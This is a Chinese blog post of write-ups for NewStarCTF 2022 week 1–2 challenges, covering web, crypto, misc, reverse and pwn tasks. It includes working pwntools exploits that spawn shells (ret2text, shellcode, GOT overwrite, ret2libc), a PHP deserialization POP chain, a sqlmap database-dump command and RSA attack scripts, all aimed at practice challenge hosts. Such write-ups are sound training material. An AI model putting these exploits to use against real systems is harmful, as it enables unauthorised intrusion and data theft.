---
title: NewStarCTF
date: 2022-09-27 19:36:39
tags: 
       - 赛后复盘
       - CTF
categories: 
       - [赛后复盘]
       - [CTF]
---

![image-20220929194254854](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291942964.png?x-oss-process=hzy)

<!--more-->



# WEEK1|WEB

## HTTP

Get,post按要求传参，修改cookie得到flag

![image-20220929191001284](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291910357.png?x-oss-process=hzy)

## Head?Header!

按要求就对了

![image-20220929191043868](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291914382.png?x-oss-process=hzy)

## 我真的会谢

![image-20220929191451695](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291914753.png?x-oss-process=hzy)

扫目录即可，flag三部分三个目录，都敏感目录

Robots文件flag{Th1s_Is_s00

index.php.swp 0_e4sy_d0_y00

[www.zip](http://www.zip) u_th1nk_so?}

flag{Th1s_Is_s000_e4sy_d0_y00u_th1nk_so?}

## Word-For-You

Sql注入

![image-20220929191516057](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291915178.png?x-oss-process=hzy)

flag{Th1s_is_0_simp1e_S0L_test}

## NotPHP

```
这道题目难点就在eval("#".$_GET['cmd']);
```

前面那一堆都是基操绕过，这个eval拼接刚开始有个注释符，导致后面的命令也不生效，是使用换行符绕过%0a,需要编码才行

![image-20220929191541794](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291915857.png?x-oss-process=hzy)

flag{35b52d41-2437-4bda-9e73-41477681c983}

# WEEK1|CRYPTO

## Caeser

Rot13解密

## 吉奥万·巴蒂斯塔·贝拉索先生的密码

```
pqcq{gteygpttmj_kc_zuokwv_kqb_gtofmssi_mnrrjt}



Hint: key length is 3
```

维吉尼亚密码 ，密钥是kfc

用这个在线网站[Vigenere Solver - www.guballa.de](https://guballa.de/vigenere-solver)

flag{bruteforce_is_useful_for_breaking_cipher}

## chaos

```
def LC(key, x, times, flags):
    (k1, k2) = key
    xn = []
    xn.append(x)
    if flags:
        xn.append(1 - 2 * xn[0]**2)
    else:
        xn.append(k2 * xn[0]**3 + (1 - k2)*xn[0])
    for i in range(times):
        assert xn[i]>=-1 and xn[i]<=1 and xn[i+1]>=-1 and xn[i+1]<=1
        if flags:
            xn.append((1 - 2 * xn[i]**2)*(k1 * xn[i+1]**3 + (1 - k1)*xn[i+1]))
        else:
            xn.append((k2 * xn[i]**3 + (1 - k2)*xn[i])*(1 - 2 * xn[i+1]**2))
    return xn[times + 1]

sum, r = 0, 1

keyx= [107, 99, 55, 198, 210, 56, 137, 44, 127, 25, 150, 113, 75, 215, 187, 132]

for i in range(16):
    sum += keyx[i]
    r ^= keyx[i]

a_1 = (sum/256) % 1
timea1 = 3 + int(1000 * a_1) % 30
b_1 = (r/256)
timeb1 = 3 + int(1000 * b_1) % 30
xc_1 = a_1 * b_1
yc_1 = (a_1 + b_1) % 1

key=(3.967139695598587, 3.7926025078694305 )
data=(a_1, timea1, b_1, timeb1, xc_1, yc_1)
print(data)

res=[23, 84, 105, 111, 230, 105, 97, 50, 58, 61, 25, 97, 57, 21, 175, 77, 102, 138, 120, 17, 66, 172, 52, 178, 101, 221, 109, 126, 71, 149, 63, 32, 56, 6, 134, 255, 110, 57, 15, 20, 116]

(k1, k2) = key
(a_1, timea1, b_1, timeb1, xc_1, yc_1) = data
m, c = [], []
miu, omiga = [], []
ta = timea1
tb = timeb1

for i in range(0,41):
    for tmpx in range(20,127):
        mi = tmpx
        miu_tmp= LC(key, a_1, ta, 1)
        omiga_tmp=  LC(key, b_1, tb, 0)

        tmpres = ((int(miu_tmp * 1000) + int(omiga_tmp * 1000)) ^ mi) % 256
        if tmpres==res[i]:
            print(tmpx)
            delta = res[i]/256
            for i in range(3):
                y = (yc_1 + delta) % 1
                y = k1 * y**3 + (1 - k1) * y
                x = xc_1
                x = k2 * x**3 + (1 - k2) * x
            ta = 3 + int(1000 * x) % 30
            tb = 3 + int(1000 * y) % 30
            break

```

![image-20220929191630974](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291916006.png?x-oss-process=hzy)

```
125对应ascii就是f，所以这就是flag
都解码一下
sum, r, k = 0, 1, [107, 99, 55, 198, 210, 56, 137, 44, 127, 25, 150, 113, 75, 215, 187, 132]  
k1,k2 = 3.967139695598587, 3.7926025078694305
for i in k:
    sum += i
    r ^= i
a_1 = (sum/256) % 1
timea1 = 3 + int(1000 * a_1) % 30
b_1 = (r/256)
timeb1 = 3 + int(1000 * b_1) % 30
xc_1 = a_1 * b_1
yc_1 = (a_1 + b_1) % 1
  
  
data = (a_1, timea1, b_1, timeb1, xc_1, yc_1)
  
  
key = (k1,k2)
  
  
print(key,data)
  
def LC(key, x, times, flags):
    (k1, k2) = key
    xn = []
    xn.append(x)
    if flags:
        xn.append(1 - 2 * xn[0]**2)
    else:
        xn.append(k2 * xn[0]**3 + (1 - k2)*xn[0])
    for i in range(times):
        assert xn[i]>=-1 and xn[i]<=1 and xn[i+1]>=-1 and xn[i+1]<=1
        if flags:
            xn.append((1 - 2 * xn[i]**2)*(k1 * xn[i+1]**3 + (1 - k1)*xn[i+1]))
        else:
            xn.append((k2 * xn[i]**3 + (1 - k2)*xn[i])*(1 - 2 * xn[i+1]**2))
    return xn[times + 1]
  
  
m, c = [], [23, 84, 105, 111, 230, 105, 97, 50, 58, 61, 25, 97, 57, 21, 175, 77, 102, 138, 120, 17, 66, 172, 52, 178, 101, 221, 109, 126, 71, 149, 63, 32, 56, 6, 134, 255, 110, 57, 15, 20, 116]
miu, omiga = [], []
ta = timea1
tb = timeb1
  
  
res = []
for flag in c:
    miu.append(LC(key, a_1, ta, 1))
    omiga.append(LC(key, b_1, tb, 0))
    res.append(((int(miu[-1] * 1000) + int(omiga[-1] * 1000))%256)^flag)
    delta = flag/256
    for i in range(3):
        y = (yc_1 + delta) % 1
        y = k1 * y**3 + (1 - k1) * y
        x = xc_1
        x = k2 * x**3 + (1 - k2) * x
    ta = 3 + int(1000 * x) % 30
    tb = 3 + int(1000 * y) % 30
print(res)
  
  
f = ""
for i in res:
    f += chr(i)
print(f)
  
flag{ii24nji9-8ckkpil1-5hiev3n6-1u24g07m}
这道题目第一周没写出来，看到的大佬的wp才明白，还是太菜了

```

## RSA_begin

一共有五个rsa，应该每个是一部分的flag

第一个是知道c,p,q,n求解

![image-20220929191757174](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291923676.png?x-oss-process=hzy)

```
import libnum
from Crypto.Util.number import long_to_bytes
 
c = 22160015525054597533062795679117215923801827397299805735087138192137742945881204146337349060934854888054628153923021387981306839951210090523829296521835965212118849043671673133979884712755090374758002677916820953359774554825569218497687506468472278309097929775388010403607769802840990547048001743970754496905
p = 6962443023774446497102092246794613339314677593117417573764609329949026862782472380488956732038459060928443992561763464365758383525259954798321350043810351
q = 9631855759661411029901156175243744760977799976661519182223576693685069000499866459636568713055906075171480855575061732016121299027658733834671035383233163
n = p*q
e = 65537
#e = int("",16)

 
d = libnum.invmod(e, (p - 1) * (q - 1))
m = pow(c, d, n)   # m 的十进制形式
string = long_to_bytes(m)  # m明文
print(string)  # 结果为 b‘ m ’ 的形式

```

flag{W0w_

第二个是知道n,c,e求解

![image-20220929192351055](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291923116.png?x-oss-process=hzy)

n分解素数p，q, [factordb.com](http://factordb.com/index.php?query=134097988095851988085603926250918812377)

p=10094271714305059493

q=13284562957208247589

然后用上面那个脚本出就行

```
import libnum
from Crypto.Util.number import long_to_bytes
 
c = 17250922799297131008803303235771955129
n = 134097988095851988085603926250918812377
#n = int("",16)
e = 65537
#e = int("",16)
p=10094271714305059493
q=13284562957208247589

 
d = libnum.invmod(e, (p - 1) * (q - 1))
m = pow(c, d, n)   # m 的十进制形式
string = long_to_bytes(m)  # m明文
print(string)  # 结果为 b‘ m ’ 的形式

```

U_ar3_re4

第三个也是给了n,c但是n的值很大

![image-20220929192421750](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291924815.png?x-oss-process=hzy)

E是3，n又很大，所以直接低指数加密攻击

因为e很小的话，明文m的e次方=密文c+kn，可以直接通过对c+kn开e次方根，返回能开e次方根的结果。

对k进行爆破，脚本如下

```
import gmpy2
import libnum

def de(c, e, n):
    k = 0
    while True:
        mm = c + n*k
        result, flag = gmpy2.iroot(mm, e)
        if True == flag:
            return result
        k += 1
e= 3
c = 2776571135646565181849912433877522437622755332262910824866791711
n = 85793694792655420934945863688968944466300304898903354212780512650924132933351787673979641944071634528676901506049360194331553838080226562532784448832916022442020751986591703547743056267118831445759258041047213294368605599719242059474324548598203039032847591828382166845797857139844445858881218318006747115157

m=de(c,e,n)
print(m)
print(libnum.n2s(int(m)).decode())


```

L1y_g0Od_

[(62条消息) CTF_RSA_低加密指数攻击脚本_风二西的博客-CSDN博客_ctf rsa脚本](https://blog.csdn.net/fengerxi33/article/details/123353560)

第四部分e就很大了，这种使用渐进式分数把d爆破出来

```
import gmpy2
 
 
def transform(x, y):  # 使用辗转相处将分数 x/y 转为连分数的形式
    res = []
    while y:
        res.append(x // y)
        x, y = y, x % y
    return res
 
 
def continued_fraction(sub_res):
    numerator, denominator = 1, 0
    for i in sub_res[::-1]:  # 从sublist的后面往前循环
        denominator, numerator = numerator, i * numerator + denominator
    return denominator, numerator  # 得到渐进分数的分母和分子，并返回
 
 
# 求解每个渐进分数
def sub_fraction(x, y):
    res = transform(x, y)
    res = list(map(continued_fraction, (res[0:i] for i in range(1, len(res)))))  # 将连分数的结果逐一截取以求渐进分数
    return res
 
 
def get_pq(a, b, c):  # 由p+q和pq的值通过维达定理来求解p和q
    par = gmpy2.isqrt(b * b - 4 * a * c)  # 由上述可得，开根号一定是整数，因为有解
    x1, x2 = (-b + par) // (2 * a), (-b - par) // (2 * a)
    return x1, x2
 
 
def wienerAttack(e, n):
    for (d, k) in sub_fraction(e, n):  # 用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数
        if k == 0:  # 可能会出现连分数的第一个为0的情况，排除
            continue
        if (e * d - 1) % k != 0:  # ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)
            continue
 
        phi = (e * d - 1) // k  # 这个结果就是 φ(n)
        px, qy = get_pq(1, n - phi + 1, n)
        if px * qy == n:
            p, q = abs(int(px)), abs(int(qy))  # 可能会得到两个负数，负负得正未尝不会出现
            d = gmpy2.invert(e, (p - 1) * (q - 1))  # 求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d
            return d
    print("该方法不适用")
 
 
e = 51999725233581619348238930320668315462087635295211755849675812266270026439521805156908952855288255992098479180003264827305694330542325533165867427898010879823017054891520626992724274019277478717788189662456052796449734904215067032681345261878977193341769514961038309763898052908572726913209883965288047452751
n = 68816697240190744603903822351423855593899797203703723038363240057913366227564780805815565183450516726498872118491739132110437976570592602837245705802946829337567674506561850972973663435358068441037127926802688722648016352967768929007662772115485020718202683004813042834036078650571763978066558718285783045969
d = wienerAttack(e, n)
print("d=", d)

```

得到d= 12966126097163765179

```
import gmpy2
import libnum

def continuedFra(x, y):
    """计算连分数
    :param x: 分子
    :param y: 分母
    :return: 连分数列表
    """
    cf = []
    while y:
        cf.append(x // y)
        x, y = y, x % y
    return cf
def gradualFra(cf):
    """计算传入列表最后的渐进分数
    :param cf: 连分数列表
    :return: 该列表最后的渐近分数
    """
    numerator = 0
    denominator = 1
    for x in cf[::-1]:
        # 这里的渐进分数分子分母要分开
        numerator, denominator = denominator, x * denominator + numerator
    return numerator, denominator
def solve_pq(a, b, c):
    """使用韦达定理解出pq，x^2−(p+q)∗x+pq=0
    :param a:x^2的系数
    :param b:x的系数
    :param c:pq
    :return:p，q
    """
    par = gmpy2.isqrt(b * b - 4 * a * c)
    return (-b + par) // (2 * a), (-b - par) // (2 * a)
def getGradualFra(cf):
    """计算列表所有的渐近分数
    :param cf: 连分数列表
    :return: 该列表所有的渐近分数
    """
    gf = []
    for i in range(1, len(cf) + 1):
        gf.append(gradualFra(cf[:i]))
    return gf

def wienerAttack(e, n):
    """
    :param e:
    :param n:
    :return: 私钥d
    """
    cf = continuedFra(e, n)
    gf = getGradualFra(cf)
    for d, k in gf:
        if k == 0: continue
        if (e * d - 1) % k != 0:
            continue
        phi = (e * d - 1) // k
        p, q = solve_pq(1, n - phi + 1, n)
        if p * q == n:
            return d

c = 68588738085497640698861260094482876262596289469248772328560280530093163764972313090939471997156632421517452790632223565521726590730640805290182026911025142051864898712501214753986865172996090706657535814234291235489829621372021092488300236623525366939477695283380634188510950335639019458758643273802572617191
e = 51999725233581619348238930320668315462087635295211755849675812266270026439521805156908952855288255992098479180003264827305694330542325533165867427898010879823017054891520626992724274019277478717788189662456052796449734904215067032681345261878977193341769514961038309763898052908572726913209883965288047452751
n = 68816697240190744603903822351423855593899797203703723038363240057913366227564780805815565183450516726498872118491739132110437976570592602837245705802946829337567674506561850972973663435358068441037127926802688722648016352967768929007662772115485020718202683004813042834036078650571763978066558718285783045969
d=wienerAttack(e, n)
m=pow(c, d, n)
print(type(d))
print(libnum.n2s(m).decode())

```

4t_m4th_4

第五部分给了c,hint,n

![image-20220929192518860](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291925923.png?x-oss-process=hzy)

n做了变形，不是俩个大素数直接相乘了

求p，q  ，p是n和(hint*e^e-1)的最大公约数,不会啊不会

后来发现facpord可以分解n为p，q，大意了

![image-20220929192532340](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291925400.png?x-oss-process=hzy)

得到

```
p=784744289113652780335906877235842706814379007511789871386409149315623611553214388731122686401322840674401468881626237323

2805140661188849984894717969091251

Q=125341176643729892325694094385902426153375396027156994334080777080596886614491929300892718911617005632257231379577780698
 86363333248734538990407281949985777

又e=65537

n = 1232865496850144050320992645475166723525103370117149219196294373695624167653495180701004894188767069545579706264513808335877905149818445940067870026924895990672091745229251935876434509430457142930654307044403355838663341948471348893414890261787326255632362887647279204029327042915224570484394917295606592360109952538313570951448278525753313335289675455996833500751672463525151201002407861423542656805624090223118747404488579783372944593022796321473618301206064979

c= 1135954814335407362237156338232840769700916726653557860319741136149066730262056907097728029957898420630256832277578506404721904131425822963948589774909272408535427656986176833063600681390871582834223748797942203560505159946141171210061405977060061656807175913366911284450695116982731157917343650021723054666494528470413522258995220648163505549701953152705111304471498547618002847587649651689203632845303117282630095814054989963116013144483037051076441508388998829
```

 

所以flag是flag{W0w_U_ar3_re4L1y_g0Od_4t_m4th_4()}

[(62条消息) BUUCTF NewStarCTF一些新知识记录_Aiwin-Lau的博客-CSDN博客](https://blog.csdn.net/weixin_53090346/article/details/126978929)

## Eazyxor

异或，但是有随机数os.urandom(size)

**size:**它是字符串随机字节的大小

**返回值：**此方法返回一个字符串，该字符串表示适合加密用途的随机字节。

![image-20220929192607616](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291926722.png?x-oss-process=hzy)

异或加密，异或两次就等于没异或，所以再异或一次

Key[0]是随机数，爆破一下

```
from os import urandom
import binascii
 
key = urandom(1)
 
 
def xor(plaintext, key):
    ret = []
    for i in range(len(plaintext)):
        ret.append(plaintext[i] ^ key)
    return bytes(ret)
 
 
global i
try:
    for i in range(150, 255):
        s = binascii.a2b_hex('9b919c9a8685cd8fa294c8a28c88cc89cea2ce9c878480')
        ciphertext = xor(s, i)
        print(ciphertext.decode(), i)
except UnicodeDecodeError:
    print('wrong', i)

```

![image-20220929192659980](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291927076.png?x-oss-process=hzy)

flag{x0r_i5_qu1t3_3azy}

# WEEK1|MISC

## Yesec no drumsticks 1

图片lsb得flag

 

flag{Yesec_1s_lsb}

## qsdz's girlfriend 1

压缩包提示是生日，爆破密码，掩码爆破得到密码是20031201

打开是个

![image-20220929192716454](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291929528.png?x-oss-process=hzy)

他是Hikari

所以flag是

flag{Hikari_20031201}

## 奇怪的音频

Audacity打开之后发现是sstv隐写，使用sstv得到flag

![image-20220929193039238](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291930347.png?x-oss-process=hzy)

flag{SSTV_and_R0b0t36}

## Look my eyes

Silent eyes工具隐写，decode之后base64解码得到flag

flag{L0ok_m3_1n_my_ey3s}

## EzSnake

Ce修改游戏是一个残缺的二维码

![image-20220929193056006](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291930099.png?x-oss-process=hzy)

补全二维码之后扫码得到

ZmxhZ3tZMHVfNHJlXzBuZV9vTmVfMG5FX3N0NFJ9

解码得到flag

flag{Y0u_4re_0ne_oNe_0nE_st4R}

# WEEK1|REVERSE

## Hello_Reverse

Ida打开找就完事了

flag{h3llo_r3vers1ng_w0rld}

## Baby_Re    

![image-20220929193111146](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291931219.png?x-oss-process=hzy)

跟进compare函数

![image-20220929193119872](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291931954.png?x-oss-process=hzy)

Final跟进

![image-20220929193136928](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291931003.png?x-oss-process=hzy)

Exp如下

```
a=[0x66, 0x6D, 0x63, 0x64, 0x7F, 0x56, 0x69, 0x6A, 0x6D, 0x7D, 
  0x62, 0x62, 0x62, 0x6A, 0x51, 0x7D, 0x65, 0x7F, 0x4D, 0x71, 
  0x71, 0x73, 0x79, 0x65, 0x7D, 0x46, 0x77, 0x7A, 0x75, 0x73, 
  0x21, 0x62]
flag=''
for i in range(len(a)):
    flag+=chr(a[i]^i)
print(flag)
#print(len(a))

```

**flag{Something_run_before_main?}**

**但是不对，这题不会，我是fw**

## Pyre

Pyc反编译

https://sourceforge.net/projects/pyinstallerextractor/files/dist/pyinstxtractor.py/download?use_mirror=udomain

```
encode = 'REla{PSF!!fg}!Y_SN_1_0U'
table = [7, 8, 1, 2, 4, 5, 13, 16, 20, 21, 0, 3, 22, 19, 6, 12, 11, 18, 9, 10, 15, 14, 17]
 
# encode = enc(flag)
d = {}
 
result=''
def enc(input):
    tmp = ''
    for i in range(len(input)):
        d[table[i]] = encode[i]
 
enc(encode)
for index in sorted(d):
    result+=d[index]
print(result)

```

flag{PYRE_1S_S0_FUN!!!}

# WEEK1|PWN

## ret2text

栈溢出问题，re2text基础题型，先是查看保护

![image-20220929193231252](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291932353.png?x-oss-process=hzy)

六十四位，防堆不防栈，PIE地址随机未开启

![image-20220929193241620](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291932677.png?x-oss-process=hzy)

偏移量可以在上面看到偏移量为40

寻找/bin/sh

![image-20220929193251143](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291932231.png?x-oss-process=hzy)

地址是0x400708

```
from pwn import *
p=process('./pwn')
#p=remote('node4.buuoj.cn',27924)
payload = b'a'*40 + p64(0x400708)  
p.sendline(payload)
p.interactive()

```

![image-20220929193306720](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291933796.png?x-oss-process=hzy)

flag{0f0ef9bb-5660-4b8b-a13d-e0db585f7639}

## ret2shellcode

```
from pwn import *
from LibcSearcher import *
context(arch = "amd64", os = "linux", log_level = "debug")

io= remote('node4.buuoj.cn', 25769)
#io = process("./pwn")
#gdb.attach(io)
shellcode = asm(shellcraft.sh())
print(len(shellcode))
io.recvuntil('for me?')
payload1 = shellcode.ljust(0x100,b'\x90')
io.send(payload1)

io.recvuntil('else?')
payload2 = b'a'*56+p64(0x233000)
io.send(payload2)

io.interactive()

```

flag{8e971753-e654-4c9d-b6e6-62601fdfaad8}

## fallw1nd’s gift

```
from pwn import *
context(arch = "amd64", os = "linux", log_level = "debug")

#p = process('./fallw1nd_gift')
p = remote('node4.buuoj.cn', 28071)
elf = ELF('./fallw1nd_gift')
libc=ELF("./libc-2.31.so")

#gdb.attach(p)
puts_got=elf.got['puts']#puts的got地址

p.recvline()#接收第一行
puts_addr=p.recvline()[0:14]#接收第二行地址
puts_addr=int((puts_addr),16)#把puts_addr转化为数字
p.recvline()#接收第三行
sleep(1)
p.sendline(str('004033F8'))#地址填入puts的got地址

libc_base=puts_addr-libc.symbols["puts"]#计算libc基址
system_addr=libc_base+libc.symbols["system"]#计算system地址

p.sendlineafter("content:",p64(system_addr))#覆写puts的got为system

p.interactive()


```

flag{ae45289b-c487-4d41-b2a0-f2436d02fba4}

## calc

```
from pwn import *
import string
context.log_level = 'debug'
p = remote("node4.buuoj.cn",29068)
for i in range(100):
        p.recvline(keepends=True)
        p.recvuntil(b'? ',drop=True)
        s=p.recvuntil(b'= ',drop=True)
        s=s.decode('utf-8')
        d=''
        for i in s:
                if(i=='x'):
                        i='*'
                d+=i
        #p.recvall()
        print(d)
        res=str(eval(d)).encode('utf-8')
        p.sendlineafter(b"w", res)
        p.recvline()
p.interactive()

```

 

flag{7f91cd60-1247-4f9a-8e55-2551e66e6d6b}

## ret2libc

libc-2.31.so

```
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
 
elf = ELF('./pwn')
libc = ELF('./libc-2.31.so')
r = ROP(elf)

PUTS_GOT = elf.got[b'puts']
RET = 0x40050e
PUTS_PLT = elf.plt[b'puts']
MAIN_PLT = 0x400698
print(elf.plt)
POP_RDI = (r.find_gadget(['pop rdi', 'ret']))[0]
  
p = remote('node4.buuoj.cn',28938)
p.recv()
 
payload =  b'a'*0x28+ p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
p.sendline(payload)
puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) 
print("puts_addr=>" + hex(puts_addr))
 
libc_addr = puts_addr -  libc.sym[b'puts']
print(hex(libc_addr))

payload = b'a'*0x28   +p64(RET) +  p64(POP_RDI)+p64(libc_addr+ libc.search(b'/bin/sh\0').__next__())+p64(libc_addr+libc.sym[b'system'])
print(payload)
p.send(payload)
p.interactive()


```

flag{47b6ce18-1115-439e-9e99-0e62d82ca968}

# WEEK2|MISC

## Yesec no drumsticks 2

零宽字符隐写

[Unicode Steganography with Zero-Width Characters (330k.github.io)](http://330k.github.io/misc_tools/unicode_steganography.html)

得到86MygAZ2uJi2oCxctsd28LBNRXHPLykF5LBz8f1xEikWNVpKfpce2CMHvhSJUdk7CHLrEVhGRVQvMwT8r7JUgVWGbnzxb

Base58解密—>hex转str得到flag

flag{Ingr3d1ent_0F_Yesec_i5_OOOOO}

## Coldwinds's Desktop

图片拼图得到flag

看这个文章用这个工具[(62条消息) CTF图片拼图&安装坑点_Solarzhou的博客-CSDN博客_ctf拼图题](https://blog.csdn.net/ZT7524/article/details/119981204)

![image-20220929193457657](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291934783.png?x-oss-process=hzy)

flag{Y0u_successfu11y_s01ved_the_puzz1e}

## 奇怪的二维码

![image-20220929193521264](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291935331.png?x-oss-process=hzy)

缺个定位Aztec二维码

[(62条消息) 2021SC@SDUSC Zxing开源代码（十二）Aztec二维码（一）_番茄炒蛋不加蛋！的博客-CSDN博客_aztec二维码](https://blog.csdn.net/m0_52100140/article/details/121190898)

![code2](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209301942165.png?x-oss-process=hzy)

扫码得到flag

[在线阅读Aztec条码 (aspose.app)](https://products.aspose.app/barcode/zh-hans/recognize/aztec#/recognized)

flag{Aztec_from_Age_0f_Empires}

## qsdz's girlfriend 2

![image-20220929193613363](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291936501.png?x-oss-process=hzy)

N=0x61 à97

A=0x726e à29294

B=0x6f6c64 à7302244

猫脸变换

[(62条消息) [Misc\]2022DASCTF Apr X FATE 防疫挑战赛 wp_是Mumuzi的博客-CSDN博客](https://blog.csdn.net/qq_42880719/article/details/124371307?spm=1001.2014.3001.5501)

```
import cv2
import numpy as np

def arnold_decode(image, shuffle_times, a, b):
    """ decode for rgb image that encoded by Arnold
    Args:
        image: rgb image encoded by Arnold
        shuffle_times: how many times to shuffle
    Returns:
        decode image
    """
    # 1:创建新图像
    decode_image = np.zeros(shape=image.shape,dtype=int)

    # 2：计算N
    h, w = image.shape[0], image.shape[1]
    N = h  # 或N=w

    # 3：遍历像素坐标变换
    for time in range(shuffle_times):
        for ori_x in range(h):
            for ori_y in range(w):
                # 按照公式坐标变换
                new_x = ((a * b + 1) * ori_x + (-b) * ori_y) % N
                new_y = ((-a) * ori_x + ori_y) % N
                decode_image[new_x, new_y, :] = image[ori_x, ori_y, :]
    return decode_image

img = cv2.imread("girlfriend.png")  #变换的图片
a = 29294
b = 7302244
st = 97
pic = arnold_decode(img,st,a,b)
cv2.imwrite('flag2.png',pic)  #保存得到的图片

```

![image-20220929193635243](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291936386.png?x-oss-process=hzy)

得到flag

flag{按理说这个点猪也该醒了}

## 奇怪的波形(复现)

题目给了一个算法和一个通过算法生成的图片

![image-20221031083532291](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210310835518.png?x-oss-process=hzy)

```
for (i = 0; i < 16; i++)  
{
    tmp = S * S;
    S = tmp % N;
    if (key[i] == 1)
    {
        tmp = S * m;
        S = tmp % N;
    }
    else
    {
        tmp = S * S;
        S = tmp % N;
    }
}
return m, S;
```

简单看一下这个算法，就是一个for循环，循环十六次，当key=1执行的和key!=1执行的内容是不一样的

查看一下图片可以看到波形有32个，说明每执行一次for循环会生成两个波

当两个波相等时也就是key=0的时候，不相等也就是key=1

然后看一下就知道十六次的结果是0010001001100111

即flag{0010001001100111}

# WEEK2|WEB

## UnserializeOne

题目如下

```
<?php
error_reporting(0);
highlight_file(__FILE__);
#Something useful for you : https://zhuanlan.zhihu.com/p/377676274
class Start{
    public $name;
    protected $func;

    public function __destruct()
    {
        echo "Welcome to NewStarCTF, ".$this->name;
    }

    public function __isset($var)
    {
        ($this->func)();
    }
}

class Sec{
    private $obj;
    private $var;

    public function __toString()
    {
        $this->obj->check($this->var);
        return "CTFers";
    }

    public function __invoke()
    {
        echo file_get_contents('/flag');
    }
}

class Easy{
    public $cla;

    public function __call($fun, $var)
    {
        $this->cla = clone $var[0];
    }
}

class eeee{
    public $obj;

    public function __clone()
    {
        if(isset($this->obj->cmd)){
            echo "success";
        }
    }
}

if(isset($_POST['pop'])){
    unserialize($_POST['pop']);
}

```

链子如下

```
<?php
error_reporting(E_ALL & ~E_WARNING);
highlight_file(__FILE__);
#Something useful for you : https://zhuanlan.zhihu.com/p/377676274
class Start{
    public $name;
    protected $func;
    public function __construct($a)
    {
        $this->func = $a;
    }

    public function __destruct()
    {
        echo "Welcome to NewStarCTF, ".$this->name;
    }

    public function __isset($var)
    {
        ($this->func)();
    }
}

class Sec{
    private $obj;
    private $var;

    public function __construct($a, $b)
    {
        $this->obj = $a;
        $this->var = $b;

    }
    public function __toString()
    {
        $this->obj->check($this->var);
        return "CTFers";
    }

    public function __invoke()
    {
        echo file_get_contents('/flag');
    }
}

class Easy{
    public $cla;

    public function __call($fun, $var)
    {
        $this->cla = clone $var[0];
    }
}

class eeee{
    public $obj;

    public function __clone()
    {
        if(isset($this->obj->cmd)){
            echo "success";
        }
    }
}

$target = new Sec('','');

$d = new Start($target);

$c = new eeee;
$c->obj = $d;

$b = new Easy;

$a = new Sec($b, $c);

$entry = new Start($a);
$entry->name = $a;

echo urlencode(serialize($entry));

```

![image-20220929193853022](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291938109.png?x-oss-process=hzy)

flag{570f9965-dd7b-46e8-8034-6305bd9dbae6}

## IncludeOne

![image-20220929193915636](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291939940.png?x-oss-process=hzy)

[php伪随机数漏洞 以及脚本php_mt_seed的使用教程 - 冬泳怪鸽 - 博客园 (cnblogs.com)](https://www.cnblogs.com/zaqzzz/p/9997855.html)

先是这个伪随机数爆破，使用题目上面给的工具编译一下即可使用

![image-20220929193933178](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291939281.png?x-oss-process=hzy)

过滤了base，用rot13，但是传参的file里要有NewStar，用/或者%0a都不行，用vps外带也不行，最后发现在伪协议部分使用|可以成立

![image-20220929193959124](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291941232.png?x-oss-process=hzy)

![image-20220929194005097](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291940168.png?x-oss-process=hzy)

直接读flag

![image-20220929194020590](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291940654.png?x-oss-process=hzy)

解密一下得到明文flag

flag{b4460905-114d-4e43-b071-a067139e47db}

## Word-For-You(2 Gen)(复现)

> 哇哇哇，我把查询界面改了，现在你们不能从数据库中拿到东西了吧哈哈（不过为了调试的代码似乎忘记删除了

这道题目直接sqlmap尝试了但是没跑出来，后来看大佬博客发现也是sqlmap跑

```
python .\sqlmap.py -u http://c976493d-0b86-49c7-af38-89ce184e5fca.node4.buuoj.cn:81/comments.php --data="name=NewCTFer" --random-agent -D wfy --dump-all
```

![image-20221016162353754](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210161624977.png?x-oss-process=hzy)

我只能说sqlmap还是很强的，没有掌握它的精髓

flag{Ju4t_m2ke_some_err0rs}

## ezAPI(复现)

